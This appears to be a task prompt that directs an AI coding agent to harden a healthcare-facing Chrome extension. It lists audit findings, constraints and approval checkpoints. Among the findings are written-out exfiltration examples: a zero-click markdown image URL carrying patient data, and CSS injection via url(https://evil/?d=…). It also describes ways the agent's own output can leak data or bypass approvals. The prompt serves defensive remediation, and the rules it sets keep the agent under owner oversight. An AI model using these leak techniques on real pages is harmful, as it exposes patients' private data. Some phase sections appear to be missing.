# Production-readiness rules

Full prompt: [MASTER.md](MASTER.md). Work packages: S1.md … S7.md, R1.md … R9.md.

MASTER PROMPT: make the Apty Agent production ready
You are working in the Parthu-work/apty-super-hero repository (pnpm monorepo, Chrome MV3 extension "Apty Agent"). An end-to-end audit on 2026-10-15 found the problems below. Fix them, prove each fix, and hand over reviewable builds. The extension is used on customer web applications that can hold healthcare data (PHI); treat every privacy item as a release blocker.

Everything in "Facts" was verified against the code, most of it at main = c64838b; re-check each fact before you change anything, and record any difference in REVIEW.md.

0. Rules (these override everything below)
Prerequisite. The privacy work called "Phase A" (commits 590e1e5..5fe5227, branch optimize/llm-requests: outbound masking filter, tool-result cap, form-value masking, screenshot consent, request reports) must already be on origin/main. Check for packages/browser-runtime/src/runtime/outbound-sanitizer.ts on origin/main. If it is missing, stop and ask the owner to apply the Phase A bundle first. Do not re-implement Phase A.
Branch. Create one branch, hardening/prod-ready, from the latest origin/main. Never commit to main, never merge into main, never push any branch or tag, never force-push.
Save this prompt first. Write it to docs/tasks/prod/00-rules.md plus one file per work package (S1.md … R9.md), and keep docs/STATUS.md current. After a context compaction, re-read those files; never guess scope. Read CLAUDE.md and docs/STATUS.md before anything else.
Evidence over claims. A work package is done only with passing tests and pasted output. For every behaviour change, run the new test against the old code first and show it failing, then show it passing. Never delete, skip or weaken an existing test, and never write a test without assertions. If an existing test conflicts with a required change, change only its setup, keep its assertions, and explain it in REVIEW.md. Unfinished work is marked "partial" with exactly what is missing.
Real-browser proof. Anything that crosses the Chrome boundary (extension pages, content scripts, storage, approval prompts, network) gets a test in tooling/e2e/*.e2e.test.mjs using tooling/e2e/harness.mjs (launchBrowser, startMockModel, startServer, startPageServer, openSidePanel, chatAndWait, callToolThenReport, extensionPage, restartAgent, toolResults). Run with npm run build && E2E_CHROMIUM_PATH=/opt/pw-browsers/chromium npm run test:e2e.
Verify with tooling/scripts/verify-quiet.sh typecheck lint test audit build. Run npm run typecheck before unit tests whenever you change a package's exports (sibling packages are resolved through the dist that typecheck writes). Never run unit tests and the e2e suite at the same time: timing tests fail under CPU contention.
Constraints. Add no runtime dependency (removing is fine; ai and @ai-sdk/* are already dependencies). Add no extension permission. Keep externally_connectable: {"ids": []}. Respect npm run audit:architecture (agent-core stays provider- and Chrome-free and never imports @apty/debug-contract; @apty/ui never imports @apty/browser-runtime). Never log API keys, tokens, page content, tool results, request bodies or URLs with query strings.
Never read minified bundles, dist/, source maps or lockfiles (except one targeted grep inside a third-party package's dist when you must confirm a library default, as in S2).
Owner decisions already made — do not revisit: "save" is not a risky click word; JSON exports get no header line; right-click stays gated; no @vitest/coverage-v8 in apps/mcp-bridge; skills stay as a feature; DOM Health reports keep their 12,000-token ceiling; capture_screenshot_with_highlight stays behind screenshot consent.
Known environment quirk. In slow containers, npm run test:coverage times out on three existing tests (dom-snapshot/src/__tests__/collector-budget.test.ts, health-collector.test.ts, apps/browser-extension/src/components/investigation/response-body-viewer.test.tsx). It does the same on c64838b. Don't modify those tests; to report coverage numbers, run with --testTimeout=30000 on the command line and say so.
Don't claim what you didn't run. No real AI provider, real tenant or real Web Store submission is available. Say "not run" where that applies.
1. Owner decisions to ask for at the start
Ask these in one message before you begin. Start with the work packages that don't depend on them. The default after each question applies only if the owner replies "use defaults".

ID	Question	Default
D1	Distribution: public Web Store, unlisted Web Store, or enterprise force-install (a CRX from your own update URL)?	Unlisted Web Store
D2	Extension ID: keep the pinned ID bpiondflhhdplemamgggcdajclmoeple (requires the private key and self-hosting) or adopt the Web Store's ID (Apty Client and Studio must then allow-list it)?	Adopt the Web Store ID
D3	Skills in the store build: keep user-imported skills but remove the model's ability to write and then run scripts, or turn skill execution off in the store build entirely?	Keep imported skills, remove model-written scripts
D4	In Strict mode, withhold tab titles (the model sees tab id and origin only) or keep titles?	Withhold in Strict, keep in Standard and Off
D5	License for Apty's own code: MIT (as README.md says) or proprietary?	MIT
D6	Who supplies the Apty icon artwork (an SVG or a 512×512 PNG)?	Owner supplies; R6 waits for it
D7	Which AI providers may be used with PHI (for example, only ones with a BAA)? Should Settings show a warning for other providers?	Show a warning for every provider; the owner fills in the list later
2. Facts (verified; re-check before changing)
Zero-click data leak. Model output is rendered by Streamdown with default settings (packages/ui/src/components/ai-elements/response.tsx:11, used at chatbot/components/message-item.tsx:144 and ai-elements/reasoning.tsx:171). The extension-page CSP is script-src 'self' 'wasm-unsafe-eval'; object-src 'self' (apps/browser-extension/manifest.json), with no img-src. Reproduced in Chromium: a mock-model reply ![chart](http://127.0.0.1:<port>/leak.png?d=PATIENT-NAME-MRN-123) made the side panel request that URL with no click.
OpenAI keeps requests. createOpenAI(...)(modelId) (apps/browser-extension/src/services/ai-provider.ts:190, called from hooks/browser-agent-config.ts) uses OpenAI's Responses API, and @ai-sdk/openai 3.0.47 sends store: openaiOptions.store ?? true. Nothing in the repo sets it, so page data and screenshots sent to OpenAI are stored on OpenAI's side.
Agent history is never deleted. The agent's own session store is IndexedDB aipex-sessions (hooks/browser-agent-config.ts), and it holds raw tool outputs (persisted before the outbound masking filter). It is deleted only by "New chat" on the active session (packages/ui/src/hooks/use-chat.ts:402). purgeStoredData (apps/browser-extension/src/services/stored-data.ts) clears only the UI conversation list and screenshots. Deleting a conversation from history and the 7-day/5-conversation cleanup (browser-runtime/src/conversation/conversation-storage.ts:106-118) don't touch it either. aipex_last_capture_event (apps/browser-extension/src/entrypoints/background/message-router.ts:24-27) keeps a page URL, 200 characters of text and the attributes of the last captured element with no expiry.
Privacy gaps that remain after Phase A.
Tab tools return raw titles and full URLs (browser-runtime/src/tools/tab.ts:24-25).
Page/tab context chips that the user attaches put the full URL and title into the user message.
MCP tool results skip the outbound filter (packages/browser-runtime/src/ws-bridge/ws-mcp-server.ts:370-401). The filter runs only inside the side-panel model call.
In every mode, page prose (names, MRNs, DOB, diagnoses written as plain text) is sent as shown.
PRIVACY.md claims Strict masks "titles, paths" and "patient fields".
Approval gaps (paths under packages/browser-runtime/src/).
run_console_command accepts the 15-minute "Allow on this site" grant (tools/devtools.ts:488-495, tools/approval.ts:298-302).
computer uses one grant name for typing and for risky clicks (tools/computer.ts:194, :212).
highlight_text_inline interpolates the model-supplied highlightColor, backgroundColor and fontWeight into a page <style> element (tools/page.ts:249-256, ~:324), so CSS injection such as url(https://evil/?d=…) works.
create_new_tab counts only query+fragment length (tools/click-risk.ts:195-205), and its same-origin check uses whichever tab is active (tools/tab-utils.ts:5). Meanwhile switch_to_tab is ungated (tools/tab.ts:57-131).
DOM Health application-deep mode clicks and navigates up to 30 pages without approval (apty/application-audit.ts:477, tools/dom-health.ts:84+).
The fill_form prompt hides the values (tools/element.ts:350).
The skill-run prompt shows only the name and path (tools/skill.ts:78-82), and the built-in packages/browser-runtime/src/skills/built-in/skill-creator-browser/scripts/write_file.js lets the model write a script that it then asks to run.
close_tab is ungated (tools/tab.ts:133-151).
Skill downloadFile honours saveAs:false (vm/skill-api.ts:336-340).
MCP bridge trust.
The extension auto-connects and sends its token to whatever listens on the saved localhost port, then runs any tools/call (apps/browser-extension/src/entrypoints/background/mcp-bridge.ts:85-93, packages/browser-runtime/src/ws-bridge/ws-mcp-server.ts:390). On a shared host (Citrix/RDS) another OS user can impersonate the daemon.
The daemon uses a 7-name block list and passes every other name through (apps/mcp-bridge/src/daemon-server.ts:75-83, 331, 348).
Approval grants are per tool and origin, not per requester, so a grant given in chat also covers MCP calls.
browser-cli runs /entrypoint.sh through a shell if that file exists, and BROWSER_CLI_WS_URL sends the token to any URL (apps/mcp-bridge/src/lib/daemon-client.ts:9, 226-236).
Robustness defects.
The LLM retry/backoff never runs: aipex.ts:221-268 retries only await run(..., {stream:true}). With the real @openai/agents 0.7.2, run() resolves and a 429/5xx is thrown later, during for await (:276). The existing test mocks run() to reject, which the real SDK never does.
The retry path logs the raw error with console.warn (aipex.ts:~253). AI SDK errors carry the request body.
redactKnownKeysInText skips a sensitive key whose string value is unterminated (packages/apty-debug-contract/src/json-redact.ts:296,301). In Strict, {"password":"hunter2… and {"access_token":"abc… come back unredacted.
Page-hook exclusion fails open when settings can't be read (tools/apty.ts:384, runtime/page-hooks-registration.ts:28,69).
The side panel and the service worker both overwrite apty_evidence_store and the investigation state in chrome.storage.session (packages/browser-runtime/src/apty/evidence-store.ts:99, apty/investigation-session.ts:140; apty/session-snapshot.ts:37 swallows quota errors).
There is no global unhandled-rejection handler in the service worker (apps/browser-extension/src/entrypoints/background/index.ts:23-37). Uncaught promises: background/sidepanel.ts:12,24, background/lifecycle.ts:38.
Offline errors show "Something went wrong: Failed to fetch" (packages/ui/src/adapters/chat-adapter.ts:660).
apps/browser-extension/src/components/chat-images-listener.tsx:24-36 and the capture-click-event handler (apps/browser-extension/src/entrypoints/background/message-router.ts:14-40) don't check the sender.
Release and store.
assistant-ui@0.0.78 (an unused CLI codemod tool) is a runtime dependency of the extension (apps/browser-extension/package.json:51). It is the only route by which braces (CVE-2026-93687) reaches production, and the stated reason for the pnpm.auditConfig.ignoreCves entry (docs/archive/DECISIONS.md:987) is out of date.
Unused per knip and grep: bip39, ahooks, markdown-to-jsx, remark-gfm, @modelcontextprotocol/sdk.
About 3k lines of dead code: browser-runtime/src/tools/{bookmark,history,organize-tabs}.ts, tools/tools/{clipboard,context-menus,extensions,sessions,tab-groups,window-management}/index.ts, utils/wait-helper.ts, hooks/use-storage.ts, ui/src/i18n/i18n.ts, unused ai-elements.
Stale committed packages/dom-snapshot/src/*.d.ts.
Two copies of @openai/agents-core (@openai/agents-extensions 0.5.4 next to @openai/agents 0.7.2).
Branding: storage keys are aipex_* (agent-core/src/config/storage-keys.ts); the IndexedDB is aipex-sessions; injected page ids and data-aipex-nodeid on customer pages; [AIPex] logs; the skill-creator text (SKILL.md:3, init_skill.js). check-branding.mjs:43 doesn't scan .js.
There is no settings schema version. The update branch of onInstalled only logs (apps/browser-extension/src/entrypoints/background/lifecycle.ts:39-44). packages/ui/src/components/settings/index.tsx:465 doesn't apply defaults.
Neither LICENSE nor the Inter OFL ships in the build (apps/browser-extension/vite.config.ts:53-60 copies only assets/*). The root and extension package.json have no license field.
CHANGELOG.md has nine "Unreleased" sections and no 0.1.0.
release.yml doesn't check that the tag is on main. Its gate (:78) omits audit:any, audit:docs-links and pnpm audit, all of which CI runs.
The icons assets/icon16/48/128.png are AIPex's, all 512×512. There are no store screenshots and no description copy.
The single purpose differs: the listing says "debug" (docs/store/WEB_STORE_LISTING.md:12) while the manifest says "drives Apty workflows" (manifest.json:5).
The listing's <all_urls> justification (:36) contradicts the STATUS "narrow <all_urls>" item. The remote-code answer (:40) and the data-use disclosures (:54-57) are incomplete.
The SMOKE_TEST.md:33-36 results table is empty.
About 274 user-visible English strings are hard-coded outside i18n (largest: dom-health-card.tsx, SkillDetails.tsx, route-probe-panel.tsx, preflight-panel.tsx).
Verified solid. Keep these intact; tests must stay green:
The approval gate fails closed and only a human click can answer it.
isOwnExtensionPage guards privileged messages.
No eval, new Function, innerHTML or dangerouslySetInnerHTML.
The sandbox exposes only console, fs and downloadFile: no network, no Chrome APIs.
No telemetry.
Storage is limited to trusted contexts.
The daemon binds 127.0.0.1, uses a constant-time token compare, sends the token as a subprotocol, checks Origin, and writes 0600 files.
The release pipeline checks versions and the pinned ID and writes checksums.
Phase 1: security and privacy (blockers)

Phase 3: final verification
Rebase onto the latest origin/main (no merge commits) and re-run everything.
Gates, all pasted:
rm -rf apps/browser-extension/dist, then tooling/scripts/verify-quiet.sh typecheck lint test audit build
npm run format:check
npm run test:coverage (see rule 10)
npm run audit:test-skips, audit:any, audit:docs-links
node tooling/scripts/check-extension-id.mjs
pnpm audit --prod with no ignored CVEs
the full e2e suite
tooling/scripts/release-dry-run.sh
TruffleHog over origin/main..HEAD
Re-run the S1 exfiltration probe, the S3 deletion check and the S4 PHI fixture against the final store zip loaded in Chromium.
Run npm run report:request-size and paste before/after numbers (S4 and S5 must not grow request size by more than 2%).
Checkpoint 3 (final; see §5).

5. Checkpoints (after each phase)
Run the full verify and e2e suite and paste the summaries.

Build apty-agent-prod-<phase>-<shortsha>.zip from a clean build, with manifest.json at the top.

Create a git bundle with HEAD and refs/heads/hardening/prod-ready, excluding origin/main, and run git bundle verify.

Test the apply flow in a scratch clone of main:

fetch the bundle into bundle-work
check it is a fast-forward
merge --ff-only
count the commits
Write SHA256SUMS.txt and verify it.

Secret-scan the diff (TruffleHog, verification off, no exclude list) and paste the totals.

Write REVIEW.md (it replaces the previous one; say where the old one is in history), containing:

the owner's decisions (D1–D7) and how each was applied
a commit table
the gate output
per work package: the change, red-then-green evidence, and before/after numbers where relevant
what is not done and why
conflicts between this prompt and the repo
"Observed, not changed"
a five-minute owner test script per work package
Stop. Continue only after the owner writes "approved". Start the next phase only after "continue", rebasing onto the new origin/main first. After "approved", give apply commands that the owner runs:

fetch and verify the bundle
merge --ff-only
push
a rollback with git revert <first>..<last>
a reminder to check that GitHub Actions is green
Never push yourself.

6. Do not
Commit to, merge into or push main or any remote branch or tag. Skip a checkpoint, or continue without the owner's word.
Mark anything done without a passing test and pasted output. Delete, skip or weaken a test. Write an assertion-free test.
Add a runtime dependency or an extension permission. Add network calls beyond what a work package requires. Import @apty/debug-contract into agent-core.
Claim results from a real provider, a real tenant or a real store review.
Change redaction semantics beyond S7's documented bug fix. Remove an approval prompt. Widen any grant or allow list. Revisit the decisions in rule 9.
